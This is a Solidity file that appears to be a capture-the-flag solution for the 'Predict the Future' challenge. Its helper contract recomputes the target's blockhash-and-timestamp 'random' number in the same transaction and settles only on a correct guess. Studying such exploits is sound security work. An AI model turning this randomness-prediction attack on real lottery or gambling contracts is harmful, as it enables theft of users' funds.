pragma solidity ^0.4.21;

import "./LotteryAux.sol";

contract PredictTheFutureChallenge {
    function lockInGuess(uint8) public payable {}
    
    function isComplete() public view returns (bool) {}
    
    function settle() public {}
}

contract PredictThefutureChallengeAux is LotteryAux {
    uint8 myGuess;
    
    PredictTheFutureChallenge ptfc = PredictTheFutureChallenge(0xda7b0754ca9169751FA018534d3271b45232CAD5);
    
    function enterGuess(uint8 n) public payable {
        myGuess = n;
        ptfc.lockInGuess.value(1 ether)(myGuess);
    }
    
    function checkGuess() public returns(bool) {
        require(ptfc.isComplete() == false);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        
        if (myGuess == answer) {
            ptfc.settle();
            return true;
        } else {
            return false;
        }
    }
}
